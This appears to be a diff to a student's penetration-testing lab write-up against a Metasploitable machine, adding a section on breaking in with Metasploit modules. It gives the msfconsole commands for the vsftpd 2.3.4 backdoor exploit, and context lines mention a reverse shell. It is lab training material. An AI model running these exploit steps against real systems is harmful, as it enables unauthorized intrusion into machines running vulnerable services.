@@ -131,7 +131,7 @@ Encapsulation: The logic and data of the reverse shell are bundled into the Reve
 
 ![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-28%2018-05-01.png)
 
-## Using **searchsploit** instead of exploitdb to look for  **CVEs** in **metasploitable** machine. Find location of **metaspoit** scripts in your linux machine, open the code and read it.
+## Using **searchsploit** instead of exploitdb to look for  **CVEs** in **metasploitable** machine. Find location of **metaspoit** scripts in your linux machine, open the code and read it. 
 
 **1.What is the Common Vulnerabilities and Exposures (CVE) Glossary**
 
@@ -178,3 +178,19 @@ To read about exploit we can use the following command
 
 
 ![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-26_13_10_39.png)
+
+## Using metasploit modules to break into (Exploit) metasploitable (at least 3 modules) 
+
+ 1. Exploit vsftpd 2.3.4 Backdoor:
+    
+```
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <target_ip>
+set RPORT 21
+exploit
+```
+
+![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_01_54_55.png)
+![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_01_54_32.png)
+![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_02_01_10.png)
